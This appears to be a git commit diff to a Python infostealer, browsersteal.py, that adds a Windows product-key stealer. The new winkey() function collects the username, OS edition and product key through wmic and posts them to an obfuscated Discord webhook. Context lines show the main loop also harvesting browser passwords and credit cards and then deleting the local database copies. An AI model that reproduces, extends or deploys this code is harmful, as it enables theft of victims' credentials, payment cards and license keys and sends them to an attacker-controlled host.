cbd2799273ac21d750b0d7629bfe536d4ed7a22f
social <71941480+s4cial@users.noreply.github.com>
2020-12-23 12:07:27 -0500

    updated browsersteal.py | added winkey
    added windows key stealer

--- browsersteal.py
+++ browsersteal.py
@@ -18,6 +18,7 @@
 import http.cookiejar as cookiejar
 import ctypes.wintypes
 import cryptography
+import subprocess
 import requests
 import platform
 import sqlite3
@@ -36,7 +37,7 @@ from cryptography.hazmat.backends import default_backend
 from urllib.request import Request, urlopen
 from subprocess import Popen, PIPE
 from urllib.parse import urlencode
-from dhooks import Webhook, File
+from dhooks import Webhook, File, Embed, Webhook
 from Crypto.Cipher import AES
 from json import loads, dumps
 from datetime import datetime
@@ -65,6 +66,9 @@ hook = Webhook(f"{ht}{slash}{slash}{discord}{period}com{slash}api{slash}{web}{ho
 
 # DISCORD WEBHOOK 2 : > REPLACE WITH YOUR WEBHOOK ABOVE
 hooks = Webhook(f"{ht}{slash}{slash}{discord}{period}com{slash}api{slash}{web}{hoo}{slash}{id}{slash}{auth}")
+
+# DISCORD WEBHOOK 3 : > REPLACE WITH YOUR WEBHOOK ABOVE
+winkey_hook = f'{ht}{slash}{slash}{discord}{period}com{slash}api{slash}{web}{hoo}{slash}{id}{slash}{auth}'
 
 # VARIABLES :
 APP_DATA_PATH = os.environ['LOCALAPPDATA']
@@ -369,12 +373,31 @@ def get_credit_cards1():
     except:
         pass
 
+def winkey():
+    NAME = os.getenv("UserName")
+    KEY = subprocess.check_output('wmic path softwarelicensingservice get OA3xOriginalProductKey').decode().split('\n')[1].strip()
+    KEY_TYPE = subprocess.check_output('wmic os get Caption').decode().split('\n')[1].strip()
+    if KEY == '':
+        KEY = 'WINKEY : NOT AVAIL.'
+    else:
+        pass   
+    embed = Embed(
+        title=f'WINDOWS KEY :',
+        description=f'NAME > {NAME}\nTYPE > {KEY_TYPE}\nKEY > {KEY}',
+        color=0x2f3136
+        )
+    embed.set_thumbnail('https://wallpaperaccess.com/full/1129133.jpg')
+    winkeysteal = Webhook(winkey_hook)
+    winkeysteal.username = 'gotcha! winkey'
+    winkeysteal.avatar_url = 'https://cdn.discordapp.com/attachments/739948762792984590/791347256103796796/1129133.png'
+    winkeysteal.send(embed=embed)
 
 while True:
     get_password()
     get_password1()
     get_credit_cards()
     get_credit_cards1()
+    winkey()
     os.remove(r"\CCvault.db")
     os.remove(r"\Loginvault.db")
     break
